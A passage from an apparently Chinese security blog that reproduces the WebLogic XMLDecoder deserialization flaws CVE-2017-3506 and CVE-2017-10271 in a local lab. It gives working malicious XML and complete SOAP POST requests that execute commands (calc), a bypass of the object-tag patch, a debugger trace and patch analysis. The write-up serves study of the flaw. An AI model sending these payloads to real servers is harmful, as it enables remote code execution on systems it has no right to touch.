<p>如下图，因为对应的Class对象是在resolveClass这返回的，因此这里是防御反序列化的关键。通过重写resolveClass方法，在该方法内添加一个黑名单进行校验，发现类在黑名单中就抛出错误，这样就无法获取恶意的Class对象。（但是黑名单的过滤效果是有限的）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751600032204-b0db6d33-7ae1-452c-8148-7ef06da2159d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751600032204-b0db6d33-7ae1-452c-8148-7ef06da2159d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>其中webLogic反序列化的执行流程如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751600051763-2af6f624-1968-42f5-921a-be9856a07ed2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751600051763-2af6f624-1968-42f5-921a-be9856a07ed2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="IlJLy">小结</h2>

<p>整体来说还是比较简单的，有之前学习的基础后，只需要理解T3协议的传输和T3协议包结构，就可以去构造恶意的Poc进行攻击。这个调试的过程很烦了，一直有问题，可以搭建在本地尝试…</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-10271 WebLogic XMLDecoder反序列化</title>
    <url>/2025/07/21/CVE-2017-10271WebLogicXMLDecoder/</url>
    <content><![CDATA[<h1 id="rems3">WebLogic XMLDecoder</h1>
<h2 id="dCX2v">前言</h2>

<p>今天复现一下WebLogic XMLDecoder的漏洞，CVE-2017-10271是通过<code>void</code>、<code>new</code>标签，对CVE-2017-3506（也是XMLDecoder反序列化的漏洞）补丁的绕过</p>
<h2 id="SXtis">环境配置</h2>
环境配置版本如下：

<ul>
<li>JDK7u21</li>
<li>webLogic 10.3.6</li>
</ul>
<h2 id="oeCN2">XmlEncoder和XmlDecoder</h2>

<p>XmlDecoder&#x2F;XmlEncoder是在JDK1.4版本中添加的XML格式序列化持久性方案，使用XMLEncoder来生成表示JavaBeans 组件的 XML文档，用XMLDecoder读取使用XMLEncoder创建的XML文档来获取JavaBeans</p>
<p>接下来我们使用一些Demo来看一看</p>
<h3 id="h2WnY">XmlEncoder</h3>

<p>XmlEncoder的demo代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.beans.XMLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testEncoder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.txt&quot;</span>);</span><br><span class="line">        <span class="type">XMLEncoder</span> <span class="variable">xmlEncoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLEncoder</span>(<span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(file));</span><br><span class="line">        xmlEncoder.writeObject(<span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;Hello World!&quot;</span>));</span><br><span class="line">        xmlEncoder.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们序列化<code>JButton</code>类，得到的XML文档如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_65&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.swing.JButton&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="C5DbP">XmlDecoder</h3>

<p>XmlDecoder的demo代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testDecoder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.txt&quot;</span>);</span><br><span class="line">        <span class="type">XMLDecoder</span> <span class="variable">xmlDecoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(file);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> xmlDecoder.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        xmlDecoder.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用XMLDecoder读取序列化的XML文档后，获取<code>JButton</code>类并打印如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.swing.JButton[,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,invalid,alignmentX=<span class="number">0.0</span>,alignmentY=<span class="number">0.5</span>,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@30dae81,flags=<span class="number">296</span>,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=<span class="number">2</span>,left=<span class="number">14</span>,bottom=<span class="number">2</span>,right=<span class="number">14</span>],paintBorder=<span class="literal">true</span>,paintFocus=<span class="literal">true</span>,pressedIcon=,rolloverEnabled=<span class="literal">true</span>,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Hello World!,defaultCapable=<span class="literal">true</span>]</span><br></pre></td></tr></table></figure>

<h3 id="DsPLd">XML的基础属性</h3>
<h4 id="KK6Nw">String标签</h4>

<p><code>Hello World!</code>字符串在XML中的表示为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ENtcJ">Object标签</h4>

<p>我们可以通过<code>&lt;object&gt;</code>标签来表示对象，<code>class</code>属性来指定具体的类（用于调用其内部方法），<code>method</code>属性来指定其具体的方法名（例如当构造函数的方法名为<code>new</code>时）</p>
<p><code>new JButton(&quot;Hello World!&quot;)</code>对应的XML文档如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.swing.JButton&quot;</span> <span class="attr">method</span>=<span class="string">&quot;new&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="wGc0z">Void标签</h4>

<p>我们可以头盖骨<code>void</code>标签来表示函数的调用、赋值等操作，<code>method</code>属性执行具体方法名称，对于<code>JButton b = new JButton();b.setText(&quot;Hello, world&quot;);</code>对应<code>XML</code>文档如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.swing.JButton&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;setText&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="J2E6e">array标签</h4>

<p>通过<code>array</code>标签来表示数组，<code>class</code>属性指定其具体类，<code>length</code>属性指定数组长度，内部的<code>void</code>标签的<code>index</code>属性根据指定数组索引赋值，<code>String[] s = new String[3];s[1] = &quot;Hello World!&quot;;</code>对应的XML文档如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="JfdKB">漏洞详情</h2>
<h3 id="zSE9f">漏洞原理</h3>

<p>WebLogic的WLS Secutiry组件对外提供WebService的服务，其使用XMLDecoder来进行解析XML格式数据，若其存在反序列化漏洞，则导致RCE</p>
<h3 id="UAccS">漏洞Demo</h3>

<p>这里我们看一个解析XML导致反序列化命令执行的Demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testDecoder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.txt&quot;</span>);</span><br><span class="line">        <span class="type">XMLDecoder</span> <span class="variable">xmlDecoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(file));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> xmlDecoder.readObject();</span><br><span class="line">        xmlDecoder.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>result.txt</code>文件内容如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;java version=<span class="string">&quot;1.4.0&quot;</span> class=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">void</span> class=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br><span class="line">        &lt;array class=<span class="string">&quot;java.lang.String&quot;</span> length=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">            &lt;<span class="keyword">void</span> index=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">                &lt;string&gt;Calc&lt;/string&gt;</span><br><span class="line">            &lt;/<span class="keyword">void</span>&gt;</span><br><span class="line">        &lt;/array&gt;</span><br><span class="line">        &lt;<span class="keyword">void</span> method=<span class="string">&quot;start&quot;</span>/&gt;&lt;/<span class="keyword">void</span>&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<p>看到运行解析文件后，成功命令执行</p>
<p>该XML解析后相当于执行以下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">1</span>];</span><br><span class="line">cmd[<span class="number">0</span>] = <span class="string">&quot;Calc&quot;</span>;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start();</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752117586754-d8ef57a9-d2c2-4419-a898-990dfcffe166.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752117586754-d8ef57a9-d2c2-4419-a898-990dfcffe166.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="H3FGT">漏洞复现</h3>
Weblogic 本质上是 Web Service 服务，报文内容类型是 SOAP 型 WebService 报文,所以` /wls-wsat/CoordinatorPortType `接口可以接收 XML 数据的请求包

<h4 id="vT18K">CVE-2017-3506</h4>
<h5 id="WvVix">影响版本</h5>

<p><font style="color:rgb(17, 17, 17);background-color:rgb(253, 253, 253);">CVE-2017-3506的影响版本如下</font></p>
<ul>
<li>Oracle WebLogic Server10.3.6.0.0</li>
<li>Oracle WebLogic Server12.1.3.0.0</li>
<li>Oracle WebLogic Server12.2.1.1.0</li>
<li>Oracle WebLogic Server12.2.1.2.0</li>
</ul>
<h5 id="rgazN">漏洞复现</h5>

<p>按照我们常规思路，我们构造的恶意文件会是这样的，通过<code>Runtime.getRuntime.exec(&quot;calc&quot;)</code>来执行命令，其中用Object来获取<code>Runtime</code>类</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.6.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Runtime&quot;</span> <span class="attr">method</span>=<span class="string">&quot;getRuntime&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;exec&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们构造的数据包就是这样的，</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7001</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>474</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.6.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Runtime&quot;</span> <span class="attr">method</span>=<span class="string">&quot;getRuntime&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;exec&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到成功命令执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752119491267-fd1f89cd-1cde-49c8-9969-4c01421c4191.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752119491267-fd1f89cd-1cde-49c8-9969-4c01421c4191.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="wcx8t">CVE-2017-10271</h4>
<h5 id="UHYVg">影响版本</h5>
<h5 id="qNYAj">漏洞复现</h5>

<p>在修复部分，看看解析标签是否有object，如果有就退出。在CVE-2017-10271需要绕过object标签，构造恶意XML文件如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后构造POST请求包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7001</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>482</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到成功命令执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752118460987-34dd17b2-1f7a-4cfd-ba49-044cda84da1e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752118460987-34dd17b2-1f7a-4cfd-ba49-044cda84da1e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="AmosI">漏洞分析</h3>

<p>在 <code>server/lib/wls-wsat.war/WEB-INF/web.xml</code> 文件中存在许多接口，这些接口都可以对 SOAP 报文进行处理，也就是这些接口都存在 Weblogic XMLDecoder 反序列化的漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752123352407-0e1b56dd-0bbb-4ef5-9181-4f23b916b79a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752123352407-0e1b56dd-0bbb-4ef5-9181-4f23b916b79a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们去到<code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube#processRequest </code>方法中打个断点进行调试，这个方法对接口数据进行了初步的处理</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752125755597-efe6f27d-20e5-4f68-b16d-791e539ec201.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752125755597-efe6f27d-20e5-4f68-b16d-791e539ec201.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>此处的var1为我们构造的恶意xml数据，var2获取了xmlheader，即为<code>text/xml</code>，并将其转换成了列表形式，var3是从var2中获取<code>WorkAreaConstants.WORK_AREA_HEADER</code>所得到的，最终将var3放入<code>readHeaderOld()</code>中进行处理</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752125989084-de66b4b1-9b76-44c6-8dab-b246d20192c4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752125989084-de66b4b1-9b76-44c6-8dab-b246d20192c4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>readHeaderOld</code>，较为重要的部分只有以下这部分，在这部分之前本质上都是赋值与包装的过程，var4获取了恶意XML数据中的内容部分</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126142521-461d410e-406d-4f61-9f5f-b422cdb6a73a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126142521-461d410e-406d-4f61-9f5f-b422cdb6a73a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们跟进var6参数的构造，可以看到将恶意XML数据传入XMLDecoder的构造方法中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126261286-eddda9ca-aaa0-4222-b766-d392de19cd91.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126261286-eddda9ca-aaa0-4222-b766-d392de19cd91.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后跟进<code>receive</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126412985-997c6023-2b3b-463b-b756-6c9efdc0c06b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126412985-997c6023-2b3b-463b-b756-6c9efdc0c06b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>再跟进<code>receiveRequest</code>里的<code>receiveRequest</code>方法中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126458478-5a18a271-31ff-4fc1-85aa-82cfef1e2f8a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126458478-5a18a271-31ff-4fc1-85aa-82cfef1e2f8a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>走入<code>WorkContextEntryImpl.readEntry(var1)</code>，<code>readEntry</code>调用了<code>readUTF</code>方法，<code>readUTF</code>中对<code>xmlDecoder</code>调用了 <code>readObject</code> 方法，对 XML 数据进行反序列化解析，就会触发我们的payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126726728-d045ac98-4da5-45bb-9a4a-95cd06841ed6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752126726728-d045ac98-4da5-45bb-9a4a-95cd06841ed6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="wKUyY">漏洞修复</h3>
<h4 id="amBID">CVE-2017-3506 补丁分析</h4>

<p>这里补丁在 <code>WorkContextXmlInputAdapter</code> 中添加了 validate 验证，限制了 object 标签，从而限制通过 XML 来构造类</p>
<p>绕过方法很简单，将 object 修改成 void，也就是最开始漏洞复现的 exp</p>
